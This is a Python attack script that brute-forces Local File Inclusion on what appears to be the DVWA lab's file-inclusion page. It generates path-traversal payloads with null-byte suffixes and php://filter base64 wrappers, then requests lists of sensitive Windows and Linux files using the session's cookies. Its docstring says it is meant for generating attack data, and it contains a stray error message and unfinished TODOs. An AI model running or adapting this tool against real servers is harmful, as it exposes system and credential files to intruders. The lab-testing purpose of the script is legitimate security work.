import configparser
import requests
from requests.compat import urljoin


lfi_path = 'vulnerabilities/fi/'
config = configparser.ConfigParser()
config.read('config.ini')


def make_path(filenames, prefix_length=2):
    '''
    Returns a list of test paths for a filename
    '''
    suffices = ["%00", "?"]
    prefixes = ["php://filter/convert.base64-encode/resource=", "php://filter/convert.base64-encode/resource="]
    tests = []
    if prefix_length < 1:
        pass
        # TODO: functionality incomplete
    else:
        # TODO: URL encode some paths
        for filename in filenames:
            for length in range(0, prefix_length + 1):
                path = "../" * length
                path1 = path + filename
                # if the file has an extension, try the replacing with underscore
                path2 = path + filename[::-1].replace(".", "_", 1)[::-1]
                # add suffices
                suff_res1 = map((path1 + "{}").format, suffices)
                suff_res2 = map((path2 + "{}").format, suffices)
                # add prefixes
                pref_res1 = map(("{}" + path1).format, prefixes)
                pref_res2 = map(("{}" + path2).format, prefixes)
                # add both
                pref_suff_res1 = map(("{}" + path1 + "{}").format, prefixes, suffices)  # i'm ware the shorter list wins
                pref_suff_res2 = map(("{}" + path2 + "{}").format, prefixes, suffices)
                # consolidate all
                tests.extend(list(suff_res1) + [path1, path2] + list(suff_res2) + list(pref_res1) + list(pref_res2) + list(pref_suff_res1) + list(pref_suff_res2))

    return tests

# FILE UPLOAD/DOWNLOAD
def attack(session):
    '''TypeError: unsupported operand type(s) for +: 'map' and 'list'
    Tests the url_path for Local File Inclusion Vulnerabilities. Can be improved
    But for now, just suitable for generating attack data.
    requests
    '''
    sensitive_files = []
    win_file = config['file_inclusion']['windows']
    linux_file = config['file_inclusion']['linux']

    # read the file; file name should be checked but skipping that
    sensitive_files.extend(open(win_file, "r", errors='replace').readlines())
    sensitive_files.extend(open(linux_file, "r", errors='replace').readlines())

    for sf in make_path(sensitive_files):
        sf = sf.rstrip('\n')
        brute_url = urljoin(session.get_base_url(), lfi_path + sf)
        r = requests.get(url=brute_url, cookies=session.get_cookies())
        #print(r.url)
